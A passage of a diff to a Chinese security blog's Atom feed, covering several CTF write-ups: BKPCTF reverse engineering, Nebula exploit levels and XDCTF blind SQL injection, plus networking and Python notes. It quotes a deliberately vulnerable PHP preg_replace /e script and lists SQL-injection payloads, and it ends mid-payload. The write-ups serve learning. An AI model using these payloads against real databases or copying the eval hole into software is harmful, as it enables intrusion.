/home/wwwroot/ctf5</span><br><span class="line"># 最后记得重启</span><br><span class="line">$ sudo /etc/init.<span class="keyword">d</span>/nginx restart</span><br><span class="line">$ sudo /etc/init.<span class="keyword">d</span>/php-fpm start ctf5</span><br></pre></td></tr></table></figure>]]></content>
     <summary type="html">
-    <![CDATA[<p><img src="/img/0ctf.png" alt="0ctf"><br>]]>
+    <![CDATA[<blockquote>
+<p>这次的0CTF我们投机取巧派被学院派教做人。。然后发现自己，不会js，不会php。不会python。web题看了两题，都差一点出来。。</p>
+</blockquote>]]>
     
     </summary>
     
@@ -263,9 +283,11 @@
     <link href="http://0x48.pw/2016/03/07/0x11/"/>
     <id>http://0x48.pw/2016/03/07/0x11/</id>
     <published>2016-03-07T02:16:46.000Z</published>
-    <updated>2016-03-14T13:19:21.037Z</updated>
-    <content type="html"><![CDATA[<p><img src="/img/re.jpg" alt="re"><br><a id="more"></a></p>
+    <updated>2016-03-28T10:19:25.414Z</updated>
+    <content type="html"><![CDATA[<blockquote>
 <p>这周末和小伙伴们一起打BKPCTF，我一个web狗，竟然撸逆向停不下来。。。撸了两个晚上。。。终于撸出来了。。</p>
+</blockquote>
+<a id="more"></a>
 <p>unholy这题说是ruby+python，其实我觉得主要还是逆C。。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">main.rb</span><br><span class="line">require_relative 'unholy'</span><br><span class="line">include UnHoly</span><br><span class="line">python_hi</span><br><span class="line">puts ruby_hi</span><br><span class="line">puts "Programming Skills: PRIMARILY RUBY AND PYTHON BUT I CAN <span class="operator"><span class="keyword">USE</span> <span class="keyword">ANY</span> TYPE <span class="keyword">OF</span> GEM <span class="keyword">TO</span> CONTROL <span class="keyword">ANY</span> TYPE <span class="keyword">OF</span> SNAKE<span class="string">"</span><br><span class="line">puts "</span>give me your flag<span class="string">"</span><br><span class="line">flag = gets.chomp!</span><br><span class="line">arr = flag.unpack("</span>V*<span class="string">")</span><br><span class="line">is_key_correct? arr</span></span></span><br></pre></td></tr></table></figure></p>
 <p>一个很简单的ruby脚本，不过这里需要装libruby2.1才能跑。。。（自己装装就知道了，国内装libruby2.1有点坑)<br>然后重点在于unholy.so，丢到ida中逆向看看，有几个重要的地方，主要是<code>method_check_key</code>函数，也就是ruby里的is_key_correct?<br>这个函数规定了只能传入长度为９的int型数组<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span>     [<span class="literal">rsp</span>+<span class="number">13E8h</span>+matrix+<span class="number">24h</span>], <span class="number">61735320h</span>　；　matrix[<span class="number">9</span>] = <span class="number">0x61735320</span></span><br></pre></td></tr></table></figure></p>
 <p>形成长度为10的数组，然后经过如下算法<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="label">loc_BFC:</span>                                <span class="comment">; CODE XREF: method_check_key+112j</span></span><br><span class="line"><span class="string">.text</span>:0000000000000BFC block = <span class="literal">rdx</span>                             <span class="comment">; uint32_t[2]</span></span><br><span class="line"><span class="string">.text</span>:0000000000000BFC                 <span class="keyword">mov</span>     <span class="literal">rax</span>, [<span class="literal">rbx</span>+<span class="literal">rdi</span>]</span><br><span class="line"><span class="string">.text</span>:0000000000000C00 block = <span class="literal">rax</span>                             <span class="comment">; uint32_t[2]</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C00                 <span class="keyword">xor</span>     <span class="literal">r8d</span>, <span class="literal">r8d</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C03                 <span class="keyword">mov</span>     <span class="number">edx</span>, <span class="number">eax</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C05                 <span class="keyword">shr</span>     block, <span class="number">20h</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C09</span><br><span class="line"><span class="label">loc_C09:</span>                                <span class="comment">; CODE XREF: method_check_key+FDj</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C09                 <span class="keyword">mov</span>     <span class="number">ecx</span>, <span class="literal">r8d</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C0C                 <span class="keyword">mov</span>     <span class="literal">esi</span>, <span class="number">eax</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C0E                 <span class="keyword">and</span>     <span class="number">ecx</span>, <span class="number">3</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C11                 <span class="keyword">shr</span>     <span class="literal">esi</span>, <span class="number">5</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C14                 <span class="keyword">mov</span>     <span class="literal">r9d</span>, [<span class="literal">rsp</span>+<span class="literal">rcx</span>*<span class="number">4</span>+<span class="number">13E8h</span>+key]</span><br><span class="line"><span class="string">.text</span>:0000000000000C19                 <span class="keyword">mov</span>     <span class="number">ecx</span>, <span class="number">eax</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C1B                 <span class="keyword">shl</span>     <span class="number">ecx</span>, <span class="number">4</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C1E                 <span class="keyword">xor</span>     <span class="literal">esi</span>, <span class="number">ecx</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C20                 <span class="keyword">lea</span>     <span class="number">ecx</span>, [<span class="literal">rsi</span>+<span class="literal">rax</span>]</span><br><span class="line"><span class="string">.text</span>:0000000000000C23                 <span class="keyword">add</span>     <span class="literal">r9d</span>, <span class="literal">r8d</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C26                 <span class="keyword">sub</span>     <span class="literal">r8d</span>, <span class="number">61C88647h</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C2D                 <span class="keyword">xor</span>     <span class="number">ecx</span>, <span class="literal">r9d</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C30                 <span class="keyword">add</span>     <span class="number">edx</span>, <span class="number">ecx</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C32                 <span class="keyword">mov</span>     <span class="number">ecx</span>, <span class="literal">r8d</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C35                 <span class="keyword">shr</span>     <span class="number">ecx</span>, <span class="number">0Bh</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C38                 <span class="keyword">mov</span>     <span class="literal">esi</span>, <span class="number">edx</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C3A                 <span class="keyword">and</span>     <span class="number">ecx</span>, <span class="number">3</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C3D                 <span class="keyword">shr</span>     <span class="literal">esi</span>, <span class="number">5</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C40                 <span class="keyword">mov</span>     <span class="literal">r9d</span>, [<span class="literal">rsp</span>+<span class="literal">rcx</span>*<span class="number">4</span>+<span class="number">13E8h</span>+key]</span><br><span class="line"><span class="string">.text</span>:0000000000000C45                 <span class="keyword">mov</span>     <span class="number">ecx</span>, <span class="number">edx</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C47                 <span class="keyword">shl</span>     <span class="number">ecx</span>, <span class="number">4</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C4A                 <span class="keyword">xor</span>     <span class="literal">esi</span>, <span class="number">ecx</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C4C                 <span class="keyword">lea</span>     <span class="number">ecx</span>, [<span class="literal">rsi</span>+<span class="literal">rdx</span>]</span><br><span class="line"><span class="string">.text</span>:0000000000000C4F                 <span class="keyword">add</span>     <span class="literal">r9d</span>, <span class="literal">r8d</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C52                 <span class="keyword">xor</span>     <span class="number">ecx</span>, <span class="literal">r9d</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C55                 <span class="keyword">add</span>     <span class="number">eax</span>, <span class="number">ecx</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C57                 <span class="keyword">cmp</span>     <span class="literal">r8d</span>, <span class="number">0C6EF3720h</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C5E                 <span class="keyword">jnz</span>     short loc_C09</span><br><span class="line"><span class="string">.text</span>:0000000000000C60                 <span class="keyword">shl</span>     <span class="literal">rax</span>, <span class="number">20h</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C64 block = <span class="literal">rdx</span>                             <span class="comment">; uint32_t[2]</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C64                 <span class="keyword">or</span>      <span class="literal">rax</span>, block</span><br><span class="line"><span class="string">.text</span>:0000000000000C67                 <span class="keyword">mov</span>     [<span class="literal">rbx</span>+<span class="literal">rdi</span>], <span class="literal">rax</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C6B                 <span class="keyword">add</span>     <span class="literal">rdi</span>, <span class="number">8</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C6F                 <span class="keyword">cmp</span>     <span class="literal">rdi</span>, <span class="number">28h</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C73                 <span class="keyword">jnz</span>     short loc_BFC</span><br></pre></td></tr></table></figure></p>
@@ -280,7 +302,9 @@
 <p>这个数组就是flag<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x in arry:</span><br><span class="line">	tem_hex = hex<span class="params">(x)</span>[<span class="number">2</span>:]</span><br><span class="line">	tem_list = []</span><br><span class="line">	<span class="keyword">for</span> y in xrange<span class="params">(<span class="number">0</span>, len<span class="params">(tem_hex)</span>, <span class="number">2</span>)</span>:</span><br><span class="line">		tem_list.append<span class="params">(chr<span class="params">(int<span class="params">(tem_hex[y:y+<span class="number">2</span>], <span class="number">16</span>)</span>)</span>)</span></span><br><span class="line">	tem_list.reverse<span class="params">()</span></span><br><span class="line">	flag += <span class="string">""</span>.join<span class="params">(tem_list)</span></span><br><span class="line"></span><br><span class="line">print flag</span><br><span class="line"><span class="built_in">#</span> BKPCTF&#123;hmmm _why did i even do this&#125;</span><br></pre></td></tr></table></figure></p>
 ]]></content>
     <summary type="html">
-    <![CDATA[<p><img src="/img/re.jpg" alt="re"><br>]]>
+    <![CDATA[<blockquote>
+<p>这周末和小伙伴们一起打BKPCTF，我一个web狗，竟然撸逆向停不下来。。。撸了两个晚上。。。终于撸出来了。。</p>
+</blockquote>]]>
     
     </summary>
     
@@ -295,9 +319,11 @@
     <link href="http://0x48.pw/2016/02/14/0x0F/"/>
     <id>http://0x48.pw/2016/02/14/0x0F/</id>
     <published>2016-02-14T02:16:46.000Z</published>
-    <updated>2016-03-11T07:20:45.184Z</updated>
-    <content type="html"><![CDATA[<p><img src="/img/exploit.jpg" alt="exploit"><br><a id="more"></a></p>
-<p><em>这份writeup可能水分很大，因为第一次玩这类的题目，所以一边看别人的writeup一边玩才玩的出来，不过还会有自己的总结。</em></p>
+    <updated>2016-03-28T10:20:07.726Z</updated>
+    <content type="html"><![CDATA[<blockquote>
+<p>这份writeup可能水分很大，因为第一次玩这类的题目，所以一边看别人的writeup一边玩才玩的出来，不过还会有自己的总结。</p>
+</blockquote>
+<a id="more"></a>
 <h1 id="附">附</h1><p>这游戏一开始我是直接在虚拟机中玩，后面发现自己傻的可以，虚拟机中各种不方便，不能粘贴复制之类，没有鼠标etc。</p>
 <p>后面发现，特么我只要设置下虚拟机的网络，就可以用本机shell，ssh连上去啊！</p>
 <h1 id="Level00">Level00</h1><p>第0题就是在告诉我们这系列的题目要怎么玩了，如何才算做出来。</p>
@@ -344,9 +370,9 @@
 <p>这是最简单的方法，因为这题的目的就是让我们getflag, 不过还可以进行提高，怎么getshell呢？去看LL菊苣的wp吧。。。。我没做出来。。thttpd一直报400错误。。</p>
 <h1 id="Level08">Level08</h1><p>这题是流量审计，在 <code>/home/flag08</code> 里面有一个pcap文件，拖到本地用Wireshark，然后发现全是TCP包，然后有些是包含一些不全的数据，这时候可以使用wireshark跟踪tcp流的功能</p>
 <blockquote>
-<p>右击任意一个TCP包，点击Follow TCP Stream<br><img src="/img/tcpl.png" alt="tcpl"></p>
+<p>右击任意一个TCP包，点击Follow TCP Stream<br><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-tcpl.png" alt="tcpl"></p>
 </blockquote>
-<p>然后查看密码的十六进制<br><img src="/img/tcpl2.png" alt="tcpl"></p>
+<p>然后查看密码的十六进制<br><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-tcpl2.png" alt="tcpl"></p>
 <p>可知中间跟了几个0x7f(DEL)，所以密码是 <code>backd00Rmate</code></p>
 <figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>ssh flag08<span class="variable">@nebula</span></span><br><span class="line">flag08<span class="variable">@nebula</span><span class="symbol">:~</span><span class="variable">$ </span>getflag</span><br><span class="line"><span class="constant">You </span>have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
 <h1 id="Level09">Level09</h1><p>这题是php代码审计:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">spam</span><span class="params">(<span class="variable">$email</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="variable">$email</span> = preg_replace(<span class="string">"/\./"</span>, <span class="string">" dot "</span>, <span class="variable">$email</span>);</span><br><span class="line">  <span class="variable">$email</span> = preg_replace(<span class="string">"/@/"</span>, <span class="string">" AT "</span>, <span class="variable">$email</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$email</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">markup</span><span class="params">(<span class="variable">$filename</span>, <span class="variable">$use_me</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="variable">$contents</span> = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$contents</span> = preg_replace(<span class="string">"/(\[email (.*)\])/e"</span>, <span class="string">"spam(\"\\2\")"</span>, <span class="variable">$contents</span>);</span><br><span class="line">  <span class="variable">$contents</span> = preg_replace(<span class="string">"/\[/"</span>, <span class="string">"&lt;"</span>, <span class="variable">$contents</span>);</span><br><span class="line">  <span class="variable">$contents</span> = preg_replace(<span class="string">"/\]/"</span>, <span class="string">"&gt;"</span>, <span class="variable">$contents</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$output</span> = markup(<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$argv</span>[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="variable">$output</span>;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
@@ -386,7 +412,9 @@
 <p>底层系统的水太深了。。。</p>
 ]]></content>
     <summary type="html">
-    <![CDATA[<p><img src="/img/exploit.jpg" alt="exploit"><br>]]>
+    <![CDATA[<blockquote>
+<p>这份writeup可能水分很大，因为第一次玩这类的题目，所以一边看别人的writeup一边玩才玩的出来，不过还会有自己的总结。</p>
+</blockquote>]]>
     
     </summary>
     
@@ -401,13 +429,14 @@
     <link href="http://0x48.pw/2015/12/19/0x0E/"/>
     <id>http://0x48.pw/2015/12/19/0x0E/</id>
     <published>2015-12-19T02:36:07.000Z</published>
-    <updated>2015-12-19T10:16:12.109Z</updated>
-    <content type="html"><![CDATA[<p><img src="/img/isa.png" alt="ISA"><br><a id="more"></a></p>
+    <updated>2016-03-28T10:21:20.654Z</updated>
+    <content type="html"><![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-isa.png" alt="ISA"></p>
+<a id="more"></a>
 <h1 id="OSI七层模型(Open_System_Interconnect_开放系统互连参考模型)">OSI七层模型(Open System Interconnect 开放系统互连参考模型)</h1><p>国际标准化组织(ISO)和国际电报电话咨询委员会(CCITT)联合制定的开放系统互连参考模型</p>
 <p><img src="/img/osi.jpg" alt="osi"></p>
 <h1 id="TCP/IP_协议族">TCP/IP 协议族</h1><p><img src="/img/TCPIP.png" alt="TCP/IP"></p>
 <h2 id="协议">协议</h2><p>协议族</p>
-<p><img src="/img/pro.png" alt="协议族"></p>
+<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-pro.png" alt="协议族"></p>
 <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">import <span class="keyword">socket</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">s</span> = <span class="keyword">socket</span>.<span class="keyword">socket</span>(<span class="keyword">socket</span>.AF_INET, <span class="keyword">socket</span>.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">add = (<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>)</span><br><span class="line"><span class="keyword">s</span>.<span class="keyword">bind</span>(add)</span><br><span class="line"><span class="keyword">s</span>.<span class="keyword">listen</span>(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">	conn, addr = <span class="keyword">s</span>.<span class="keyword">accept</span>();</span><br><span class="line">	<span class="keyword">print</span> addr</span><br><span class="line">	buf = conn.<span class="keyword">recv</span>(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">print</span> buf</span><br><span class="line">	conn.sendall(<span class="string">"HTTP/1.1 200 OK\n\r\n\n"</span>)</span><br><span class="line">	conn.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure>
 <h2 id="端口">端口</h2><p>大小：16bits  (0-65535)</p>
 <p>保留端口号：0-1024</p>
@@ -436,7 +465,7 @@
 <p>数据发送过去后，然后反过来解封</p>
 <h2 id="安全问题">安全问题</h2><h3 id="arp">arp</h3><h3 id="SYN">SYN</h3><h3 id="DNS">DNS</h3>]]></content>
     <summary type="html">
-    <![CDATA[<p><img src="/img/isa.png" alt="ISA"><br>]]>
+    <![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-isa.png" alt="ISA"></p>]]>
     
     </summary>
     
@@ -451,8 +480,9 @@
     <link href="http://0x48.pw/2015/12/08/0x0D/"/>
     <id>http://0x48.pw/2015/12/08/0x0D/</id>
     <published>2015-12-08T06:49:13.000Z</published>
-    <updated>2015-12-09T01:36:20.469Z</updated>
-    <content type="html"><![CDATA[<p><img src="/img/hctf.png" alt="HCTF"><br><a id="more"></a></p>
+    <updated>2016-03-28T10:21:36.350Z</updated>
+    <content type="html"><![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-hctf.png" alt="HCTF"></p>
+<a id="more"></a>
 <p>这次HCTF，我负责黑吃黑这题的出题和运维，最终只有六星一个队日穿了该题。</p>
 <hr>
 <p><strong>题目名称</strong>：Black eat black(300不足，200有余)<br><strong>题目描述</strong>：使用该DNS(180.153.47.182)后，你会被劫持哦～<br><strong>分值</strong>：300<br><strong>开题金币</strong>：300<br><strong>奖励金币</strong>：400</p>
@@ -503,7 +533,7 @@
 <p><a href="https://github.com/Hcamael/Blackeatblack" target="_blank" rel="external">源码</a></p>
 ]]></content>
     <summary type="html">
-    <![CDATA[<p><img src="/img/hctf.png" alt="HCTF"><br>]]>
+    <![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-hctf.png" alt="HCTF"></p>]]>
     
     </summary>
     
@@ -518,9 +548,12 @@
     <link href="http://0x48.pw/2015/12/01/0x0C/"/>
     <id>http://0x48.pw/2015/12/01/0x0C/</id>
     <published>2015-12-01T05:02:30.000Z</published>
-    <updated>2015-12-01T07:51:36.857Z</updated>
-    <content type="html"><![CDATA[<p><img src="/img/python.jpg" alt="Python"><br><a id="more"></a><br>已经好久没更新过博客了，因为最近开始用为知笔记了，感觉每次发到blog的都太零散了，好多都还没完成，所以现在决定，零散的写到笔记里去，然后有一个完整的内容再发到blog里来。</p>
-<p>这次是一篇完整的BaseHTTPServer模块分析，花了几天时间研究该模块，先放上我的思维导图，由于是第一次使用思维导图，所以弄得不是很满意。<br><img src="/img/BaseHTTPServer.jpeg" alt="BaseHTTPServer"></p>
+    <updated>2016-03-28T10:21:45.646Z</updated>
+    <content type="html"><![CDATA[<blockquote>
+<p>已经好久没更新过博客了，因为最近开始用为知笔记了，感觉每次发到blog的都太零散了，好多都还没完成，所以现在决定，零散的写到笔记里去，然后有一个完整的内容再发到blog里来。</p>
+</blockquote>
+<a id="more"></a>
+<p>这次是一篇完整的BaseHTTPServer模块分析，花了几天时间研究该模块，先放上我的思维导图，由于是第一次使用思维导图，所以弄得不是很满意。<br><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-BaseHTTPServer.jpeg" alt="BaseHTTPServer"></p>
 <p>分析该模块的起因是该反代程序：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> BaseHTTPServer</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CacheHandler</span><span class="params">(BaseHTTPServer.BaseHTTPRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(self)</span>:</span></span><br><span class="line">      m = hashlib.md5()</span><br><span class="line">      m.update(self.path)</span><br><span class="line">      cache_filename = m.hexdigest()</span><br><span class="line">      <span class="keyword">if</span> os.path.exists(cache_filename):</span><br><span class="line">          <span class="keyword">print</span> <span class="string">"Cache hit"</span></span><br><span class="line">          data = open(cache_filename).readlines()</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">          <span class="keyword">print</span> <span class="string">"Cache miss"</span></span><br><span class="line">          data = urllib2.urlopen(<span class="string">"http://www.baidu.com"</span> + self.path).readlines()</span><br><span class="line">          open(cache_filename, <span class="string">'wb'</span>).writelines(data)</span><br><span class="line">      self.send_response(<span class="number">200</span>)</span><br><span class="line">      self.end_headers()</span><br><span class="line">      self.wfile.writelines(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    server_address = (<span class="string">''</span>, <span class="number">9999</span>)</span><br><span class="line">    httpd = BaseHTTPServer.HTTPServer(server_address, CacheHandler)</span><br><span class="line">    httpd.serve_forever()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure></p>
 <h1 id="BaseHTTPServer">BaseHTTPServer</h1><p>在该模块中定义了两个类</p>
 <ul>
@@ -554,7 +587,9 @@
 <p>这三个方法.</p>
 ]]></content>
     <summary type="html">
-    <![CDATA[<p><img src="/img/python.jpg" alt="Python"><br>]]>
+    <![CDATA[<blockquote>
+<p>已经好久没更新过博客了，因为最近开始用为知笔记了，感觉每次发到blog的都太零散了，好多都还没完成，所以现在决定，零散的写到笔记里去，然后有一个完整的内容再发到blog里来。</p>
+</blockquote>]]>
     
     </summary>
     
@@ -569,8 +604,11 @@
     <link href="http://0x48.pw/2015/10/31/0x0B/"/>
     <id>http://0x48.pw/2015/10/31/0x0B/</id>
     <published>2015-10-31T13:28:26.000Z</published>
-    <updated>2015-10-31T13:41:04.522Z</updated>
-    <content type="html"><![CDATA[<p>10.31新生培训<br><a id="more"></a></p>
+    <updated>2016-03-28T10:21:57.638Z</updated>
+    <content type="html"><![CDATA[<blockquote>
+<p>10.31新生培训</p>
+</blockquote>
+<a id="more"></a>
 <h2 id="代码的调试之旅_——_Debug">代码的调试之旅 —— Debug</h2><ol>
 <li>VS2015<ul>
 <li>F10 step out</li>
@@ -579,7 +617,7 @@
 </li>
 <li>codeblocks<ul>
 <li>shitf F7 step into</li>
-<li>F7 step </li>
+<li>F7 step</li>
 </ul>
 </li>
 <li>gdb<ul>
@@ -620,7 +658,9 @@
 </ol>
 ]]></content>
     <summary type="html">
-    <![CDATA[<p>10.31新生培训<br>]]>
+    <![CDATA[<blockquote>
+<p>10.31新生培训</p>
+</blockquote>]]>
     
     </summary>
     
@@ -633,8 +673,11 @@
     <link href="http://0x48.pw/2015/10/05/0x09/"/>
     <id>http://0x48.pw/2015/10/05/0x09/</id>
     <published>2015-10-05T03:17:10.000Z</published>
-    <updated>2015-10-15T01:09:09.824Z</updated>
-    <content type="html"><![CDATA[<p><img src="/img/sqli.jpg" alt="SQLI"><br><a id="more"></a><br>这次的XDCTF, 关于web1 400, 学到了很多666的姿势, 开一篇新博文, 记录这些姿势..</p>
+    <updated>2016-03-28T10:22:39.150Z</updated>
+    <content type="html"><![CDATA[<blockquote>
+<p>这次的XDCTF, 关于web1 400, 学到了很多666的姿势, 开一篇新博文, 记录这些姿势..</p>
+</blockquote>
+<a id="more"></a>
 <p>原本我以为, 在select被过滤的情况下, 如果不能bypass, 就没法注入… 而这次看了writeup后, 不同的队, 姿势都不同, 大开眼界….</p>
 <p>这次题目的语句我猜测是 <code>select pic from table where ID=&quot;$i&quot;;</code><br>$i 则是可控点..</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload 0x0:</span><br><span class="line">    $i = 1" &amp;&amp; username="%</span><br><span class="line">构成以下语句:</span><br><span class="line"><span class="operator"><span class="keyword">select</span> pic <span class="keyword">from</span> talbe <span class="keyword">where</span> ID=<span class="string">"1"</span> &amp;&amp; username=<span class="string">"%"</span></span><br><span class="line">这个payload可以用来猜测是否有该字段, 接下来的盲注这语句仍然可用</span><br><span class="line"></span><br><span class="line">payload <span class="number">0x1</span>:</span><br><span class="line">    $i = <span class="number">111</span><span class="string">" OR if(rpad(username,1,1)="</span>a<span class="string">",1,0)#  或者 111"</span> <span class="keyword">OR</span> <span class="keyword">if</span>(<span class="keyword">rpad</span>(username,<span class="number">1</span>,<span class="number">1</span>)=<span class="built_in">char</span>(<span class="number">101</span>),<span class="number">1</span>,<span 